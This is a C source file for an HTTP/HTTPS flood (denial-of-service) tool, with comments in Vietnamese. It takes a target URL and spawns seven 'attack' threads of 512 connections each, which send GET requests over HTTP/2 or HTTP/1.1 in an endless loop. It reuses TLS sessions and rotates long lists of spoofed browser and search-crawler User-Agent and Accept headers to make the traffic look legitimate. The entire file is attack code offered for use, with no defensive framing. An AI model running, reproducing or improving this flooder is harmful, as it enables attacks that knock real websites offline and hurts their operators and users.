#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sched.h>
#include <sys/epoll.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <fcntl.h>
#include <time.h>
#include <assert.h>
#include <errno.h>
#include <stdatomic.h>
#include <stddef.h>

#include <openssl/ssl.h>
#include <openssl/err.h>
#include <openssl/crypto.h>
#include <nghttp2/nghttp2.h>

#define NUM_ATTACK_THREADS 7
#define CONCURRENT_CONNECTIONS_PER_THREAD 512
#define MAX_CONCURRENT_STREAMS_PER_CONNECTION 1000
#define CONNECTION_TIMEOUT_NS 5000000000L

#define C_RESET "\x1b[0m"
#define C_GREEN "\x1b[32m"
#define C_BOLD  "\x1b[1m"

// -------------------- User-Agent & Accept headers --------------------
static const char* user_agents[] = {
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/120.0.6099.109 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.109 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.109 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36",
    "Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.82 Safari/537.36",
    "Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; SM-T530NU Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Safari/537.36",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/100.0.4896.88 Safari/537.36",
    "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
    "Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; Lumia 950 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Mobile Safari/537.36 Edge/14.14393",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:91.0) Gecko/20100101 Firefox/91.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-A505FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:119.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:119.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:119.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 12; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 9; SM-G960F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:115.0) Gecko/20100101 Firefox/115.0"
};

static const char* accepts[] = {
    "*/*",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
    "application/json, text/plain, */*",
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "image/webp,image/apng,image/*,*/*;q=0.8",
    "application/signed-exchange;v=b3;q=0.9",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "text/css,*/*;q=0.1",
    "application/javascript, */*;q=0.8",
    "application/xml",
    "text/plain",
    "application/json",
    "text/xml",
    "application/x-javascript",
    "text/javascript",
    "application/ld+json",
    "application/rss+xml",
    "application/atom+xml",
    "image/png,image/svg+xml,image/*;q=0.8,*/*;q=0.5",
    "video/webm,video/ogg,video/*;q=0.9,application/ogg;q=0.7,audio/*;q=0.6,*/*;q=0.5",
    "audio/webm,audio/ogg,audio/wav,audio/*;q=0.9,application/ogg;q=0.7,video/*;q=0.6;*/*;q=0.5",
    "application/pdf,application/postscript,*/*;q=0.8",
    "application/octet-stream",
    "application/x-www-form-urlencoded",
    "multipart/form-data",
    "text/event-stream",
    "application/vnd.api+json",
    "application/hal+json",
    "application/vnd.collection+json",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "application/json;charset=UTF-8",
    "text/html;charset=UTF-8",
    "application/x-protobuf",
    "application/grpc",
    "application/msgpack"
};
// -------------------- Structs --------------------
typedef enum { CONN_STATE_DISCONNECTED, CONN_STATE_CONNECTING, CONN_STATE_HANDSHAKING, CONN_STATE_CONNECTED } connection_state;
typedef struct connection_s {
    int fd;
    SSL *ssl;
    nghttp2_session *ngh2_session;
    int thread_id;
    int epoll_fd;
    struct timespec last_activity;
    connection_state state;
    uint32_t stream_counter;
} connection_t;

typedef struct {
    int thread_id;
    unsigned int rand_seed;
    const char* user_agent;
    size_t user_agent_len;
    const char* accept_header;
    size_t accept_header_len;
    char path_with_query[2048];
    size_t base_path_len;
    char origin_header[512];
    size_t origin_header_len;
    char referer_header[1024];
} thread_context_t;

// -------------------- Globals --------------------
thread_context_t contexts[NUM_ATTACK_THREADS];
struct sockaddr_storage g_remote_addr;
SSL_CTX *g_ssl_ctx;
char g_target_host[256];
char g_target_path[1024];
int g_port = 443; // Mặc định HTTPS
int g_use_ssl = 1; // 1 = HTTPS, 0 = HTTP
static pthread_mutex_t *ssl_locks;

#define SESSION_POOL_SIZE 64
_Atomic(SSL_SESSION*) g_session_pool[SESSION_POOL_SIZE];
atomic_uint g_session_pool_idx = 0;

// -------------------- SSL callbacks --------------------
void locking_callback(int mode, int n, const char *file, int line) { 
    if (mode & CRYPTO_LOCK) pthread_mutex_lock(&ssl_locks[n]); 
    else pthread_mutex_unlock(&ssl_locks[n]); 
}
unsigned long thread_id_callback(void) { return (unsigned long)pthread_self(); }

int new_session_cb(SSL *ssl, SSL_SESSION *session) {
    unsigned int idx = atomic_fetch_add_explicit(&g_session_pool_idx, 1, memory_order_relaxed) % SESSION_POOL_SIZE;
    SSL_SESSION *new_sess = SSL_SESSION_dup(session);
    if (!new_sess) return 0;
    SSL_SESSION *old_sess = atomic_exchange_explicit(&g_session_pool[idx], new_sess, memory_order_relaxed);
    if (old_sess) SSL_SESSION_free(old_sess);
    return 1;
}

// -------------------- NGHTTP2 callbacks --------------------
ssize_t send_callback(nghttp2_session *session, const uint8_t *data, size_t length, int flags, void *user_data) {
    connection_t *conn = user_data; int rv;
    clock_gettime(CLOCK_MONOTONIC, &conn->last_activity);
    if(g_use_ssl && conn->ssl) rv = SSL_write(conn->ssl, data, length);
    else rv = write(conn->fd, data, length);
    if(rv <= 0) return NGHTTP2_ERR_CALLBACK_FAILURE;
    return rv;
}

ssize_t recv_callback(nghttp2_session *session, uint8_t *buf, size_t length, int flags, void *user_data) {
    connection_t *conn = user_data; int rv;
    clock_gettime(CLOCK_MONOTONIC, &conn->last_activity);
    if(g_use_ssl && conn->ssl) rv = SSL_read(conn->ssl, buf, length);
    else rv = read(conn->fd, buf, length);
    if(rv <= 0) return NGHTTP2_ERR_CALLBACK_FAILURE;
    return rv;
}

int on_stream_close_callback(nghttp2_session *session, int32_t stream_id, uint32_t error_code, void *user_data) {
    // Có thể submit lại request nếu cần
    return 0;
}

// -------------------- Connection & attack --------------------
void submit_http_request(connection_t *conn, thread_context_t *ctx) {
    if(!conn) return;
    if(g_use_ssl) {
        // HTTPS/HTTP2 request
        const nghttp2_nv headers[] = {
            { (uint8_t*)":method", (uint8_t*)"GET", 7-1, 3, NGHTTP2_NV_FLAG_NONE },
            { (uint8_t*)":scheme", (uint8_t*)"https", 7-1, 5, NGHTTP2_NV_FLAG_NONE },
            { (uint8_t*)":authority", (uint8_t*)g_target_host, 10-1, strlen(g_target_host), NGHTTP2_NV_FLAG_NONE },
            { (uint8_t*)":path", (uint8_t*)ctx->path_with_query, 5-1, strlen(ctx->path_with_query), NGHTTP2_NV_FLAG_NONE },
            { (uint8_t*)"user-agent", (uint8_t*)ctx->user_agent, 10-1, ctx->user_agent_len, NGHTTP2_NV_FLAG_NONE },
            { (uint8_t*)"accept", (uint8_t*)ctx->accept_header, 6-1, ctx->accept_header_len, NGHTTP2_NV_FLAG_NONE },
        };
        nghttp2_submit_request(conn->ngh2_session, NULL, headers, sizeof(headers)/sizeof(headers[0]), NULL, NULL);
    } else {
        // HTTP/1.1 request
        char req[2048];
        int len = snprintf(req, sizeof(req),
            "GET %s HTTP/1.1\r\n"
            "Host: %s\r\n"
            "User-Agent: %s\r\n"
            "Accept: %s\r\n"
            "Connection: keep-alive\r\n\r\n",
            ctx->path_with_query, g_target_host, ctx->user_agent, ctx->accept_header
        );
        write(conn->fd, req, len);
    }
}

void reset_connection(connection_t *conn) {
    if(!conn) return;
    if(conn->fd != -1) { close(conn->fd); conn->fd = -1; }
    if(conn->ssl) { SSL_free(conn->ssl); conn->ssl = NULL; }
    if(conn->ngh2_session) { nghttp2_session_del(conn->ngh2_session); conn->ngh2_session = NULL; }

    conn->fd = socket(g_remote_addr.ss_family, SOCK_STREAM | SOCK_NONBLOCK, 0);
    if(conn->fd == -1) return;

    int one = 1;
    setsockopt(conn->fd, IPPROTO_TCP, TCP_NODELAY, &one, sizeof(one));

    int ret = connect(conn->fd, (struct sockaddr*)&g_remote_addr, (g_remote_addr.ss_family == AF_INET) ? sizeof(struct sockaddr_in) : sizeof(struct sockaddr_in6));
    if(ret == -1 && errno != EINPROGRESS) { close(conn->fd); conn->fd=-1; return; }

    conn->state = CONN_STATE_CONNECTING;
    clock_gettime(CLOCK_MONOTONIC, &conn->last_activity);

    if(g_use_ssl) {
        conn->ssl = SSL_new(g_ssl_ctx);
        SSL_set_fd(conn->ssl, conn->fd);
        SSL_set_connect_state(conn->ssl);
        SSL_set_tlsext_host_name(conn->ssl, g_target_host);
        unsigned int idx = rand_r(&contexts[conn->thread_id].rand_seed) % SESSION_POOL_SIZE;
        SSL_SESSION *sess = atomic_load_explicit(&g_session_pool[idx], memory_order_relaxed);
        if(sess) SSL_set_session(conn->ssl, sess);

        nghttp2_session_callbacks *callbacks; nghttp2_session_callbacks_new(&callbacks);
        nghttp2_session_callbacks_set_send_callback(callbacks, send_callback);
        nghttp2_session_callbacks_set_recv_callback(callbacks, recv_callback);
        nghttp2_session_callbacks_set_on_stream_close_callback(callbacks, on_stream_close_callback);
        nghttp2_session_client_new(&conn->ngh2_session, callbacks, conn);
        nghttp2_session_callbacks_del(callbacks);
    }
}

// -------------------- Attack thread --------------------
void *attack_thread(void *arg) {
    thread_context_t *ctx = arg;
    int epoll_fd = epoll_create1(0);
    connection_t* connections = calloc(CONCURRENT_CONNECTIONS_PER_THREAD, sizeof(connection_t));

    ctx->user_agent = user_agents[rand_r(&ctx->rand_seed) % (sizeof(user_agents)/sizeof(char*))];
    ctx->user_agent_len = strlen(ctx->user_agent);
    ctx->accept_header = accepts[rand_r(&ctx->rand_seed) % (sizeof(accepts)/sizeof(char*))];
    ctx->accept_header_len = strlen(ctx->accept_header);
    strncpy(ctx->path_with_query, g_target_path, sizeof(ctx->path_with_query)-1);

    for(int i=0;i<CONCURRENT_CONNECTIONS_PER_THREAD;i++){
        connections[i].thread_id = ctx->thread_id;
        connections[i].epoll_fd = epoll_fd;
        connections[i].fd=-1;
        reset_connection(&connections[i]);
    }

    while(1){
        struct timespec now; clock_gettime(CLOCK_MONOTONIC, &now);
        for(int i=0;i<CONCURRENT_CONNECTIONS_PER_THREAD;i++){
            if(connections[i].fd!=-1) submit_http_request(&connections[i], ctx);
        }
        usleep(10000); // delay nhỏ tránh CPU 100%
    }

    free(connections);
    close(epoll_fd);
    return NULL;
}

// -------------------- Main --------------------
int main(int argc, char *argv[]) {
    if(argc!=2){ fprintf(stderr,"Usage: %s [url]\n", argv[0]); return 1; }

    char scheme[10]; g_target_path[0]='/'; g_target_path[1]='\0';
    sscanf(argv[1], "%9[^:]://%255[^/]%1023s", scheme, g_target_host, g_target_path);

    if(strcmp(scheme,"https")==0){ g_use_ssl=1; g_port=443; }
    else if(strcmp(scheme,"http")==0){ g_use_ssl=0; g_port=80; }
    else { fprintf(stderr,"URL must start with http:// or https://\n"); return 1; }

    struct addrinfo hints={0},*res;
    hints.ai_family=AF_UNSPEC; hints.ai_socktype=SOCK_STREAM;
    char portstr[6]; snprintf(portstr,sizeof(portstr),"%d",g_port);
    if(getaddrinfo(g_target_host,portstr,&hints,&res)!=0){ perror("Failed to resolve host"); return 1; }
    memcpy(&g_remote_addr,res->ai_addr,res->ai_addrlen); freeaddrinfo(res);

    if(g_use_ssl){
        SSL_library_init(); OpenSSL_add_all_algorithms(); SSL_load_error_strings();
        ssl_locks = malloc(CRYPTO_num_locks()*sizeof(pthread_mutex_t));
        for(int i=0;i<CRYPTO_num_locks();i++) pthread_mutex_init(&ssl_locks[i],NULL);
        CRYPTO_set_id_callback(thread_id_callback); CRYPTO_set_locking_callback(locking_callback);

        g_ssl_ctx = SSL_CTX_new(TLS_client_method());
        SSL_CTX_set_cipher_list(g_ssl_ctx,"EECDH+CHACHA20:EECDH+AESGCM:EDH+AESGCM:!aNULL:!eNULL:!MD5");
        SSL_CTX_set_alpn_protos(g_ssl_ctx,(const unsigned char*)"\x02h2",3);
        SSL_CTX_set_session_cache_mode(g_ssl_ctx, SSL_SESS_CACHE_CLIENT|SSL_SESS_CACHE_NO_INTERNAL);
        SSL_CTX_sess_set_new_cb(g_ssl_ctx,new_session_cb);
    }

    for(int i=0;i<SESSION_POOL_SIZE;i++) atomic_init(&g_session_pool[i],NULL);

    srand(time(NULL)^getpid());
    pthread_t attack_threads[NUM_ATTACK_THREADS];
    long num_cores=sysconf(_SC_NPROCESSORS_ONLN);

    for(int i=0;i<NUM_ATTACK_THREADS;i++){
        contexts[i].thread_id=i;
        contexts[i].rand_seed=time(NULL)^(getpid()<<8)^i;

        pthread_attr_t attr; pthread_attr_init(&attr);
        cpu_set_t cpuset; CPU_ZERO(&cpuset); CPU_SET(i%num_cores,&cpuset);
        pthread_attr_setaffinity_np(&attr,sizeof(cpu_set_t),&cpuset);

        pthread_create(&attack_threads[i], &attr, attack_thread, &contexts[i]);
    }

    for(int i=0;i<NUM_ATTACK_THREADS;i++) pthread_join(attack_threads[i],NULL);
    return 0;
}
